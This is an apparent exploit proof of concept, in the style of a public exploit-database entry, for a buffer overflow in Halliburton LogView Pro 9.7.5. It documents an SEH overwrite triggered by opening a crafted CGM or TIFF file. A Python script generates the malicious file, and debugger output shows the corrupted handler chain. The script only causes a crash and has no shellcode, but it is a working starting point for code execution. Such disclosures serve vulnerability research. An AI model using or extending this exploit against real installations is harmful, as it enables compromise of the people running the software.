# Exploit Title: [Haliburton LogView Pro v9.7.5]
# Exploit Author: [Karn Ganeshen]
# Download link: [http://www.halliburton.com/public/lp/contents/Interactive_Tools/web/Toolkits/lp/Halliburton_Log_Viewer.exe]

# Version: [Current version 9.7.5]
# Tested on: [Windows Vista Ultimate SP2]
#
# Open cgm/tif/tiff/tifh file -> program crash -> SEH overwritten
#
# SEH chain of main thread
# Address SE handler
# 0012D22C kernel32.76B6FEF9
# 0012D8CC 42424242
# 41414141 *** CORRUPT ENTRY ***
#

#!/usr/bin/python

file="evil.cgm"
buffer = "A"*804 + "B"*4

file = open(file, 'w')
file.write(buffer)
file.close()

# +++++
